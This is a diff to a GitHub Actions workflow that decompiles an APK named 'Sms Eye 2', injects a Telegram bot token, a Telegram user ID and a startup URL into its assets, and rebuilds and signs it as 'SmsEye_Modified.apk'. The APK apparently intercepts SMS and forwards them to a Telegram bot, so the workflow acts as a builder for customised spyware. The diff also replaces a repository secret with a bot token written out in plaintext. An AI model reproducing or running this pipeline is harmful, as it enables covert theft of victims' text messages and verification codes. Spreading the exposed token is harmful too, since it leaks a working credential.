@@ -1,4 +1,4 @@
-name: Inject Telegram Details into APK
+name: Inject ID and URL into APK
 
 on:
   workflow_dispatch:
@@ -6,8 +6,11 @@ on:
       apk_url:
         description: 'Direct URL to base APK file (Sms Eye 2 APK)'
         required: true
+      user_id:
+        description: 'Telegram numeric user ID (for id.txt)'
+        required: true
       app_url:
-        description: 'URL to display on app startup (url.txt)'
+        description: 'Startup URL to inject in url.txt'
         required: true
 
 jobs:
@@ -15,16 +18,16 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Checkout Repository
+    - name: Checkout code
       uses: actions/checkout@v3
 
-    - name: Install Dependencies
+    - name: Install dependencies
       run: |
         sudo apt update
         sudo apt install -y default-jdk wget zipalign
         wget https://github.com/iBotPeaches/Apktool/releases/latest/download/apktool_2.9.3.jar -O apktool.jar
 
-    - name: Download Base APK
+    - name: Download APK
       run: |
         wget "${{ github.event.inputs.apk_url }}" -O base.apk
 
@@ -32,10 +35,10 @@ jobs:
       run: |
         java -jar apktool.jar d base.apk -o decoded_apk --force
 
-    - name: Inject Telegram Details into Assets
+    - name: Inject token, user ID, and startup URL
       run: |
-        echo "${{ secrets.BOT_TOKEN }}" > decoded_apk/assets/token.txt
-        echo "${{ secrets.CHAT_ID }}" > decoded_apk/assets/id.txt
+        echo "8000560638:AAHrOlt9b4U-QKmgnuOBl7bDxGzuz2wGXi4" > decoded_apk/assets/token.txt
+        echo "${{ github.event.inputs.user_id }}" > decoded_apk/assets/id.txt
         echo "${{ github.event.inputs.app_url }}" > decoded_apk/assets/url.txt
 
     - name: Rebuild APK
@@ -49,8 +52,8 @@ jobs:
         jarsigner -verbose -keystore keystore.jks -storepass password -keypass password unsigned.apk key0
         mv unsigned.apk SmsEye_Modified.apk
 
-    - name: Upload Final APK
+    - name: Upload Patched APK
       uses: actions/upload-artifact@v4
       with:
-        name: Patched-SmsEye-APK
+        name: SmsEye-Patched-APK
         path: SmsEye_Modified.apk
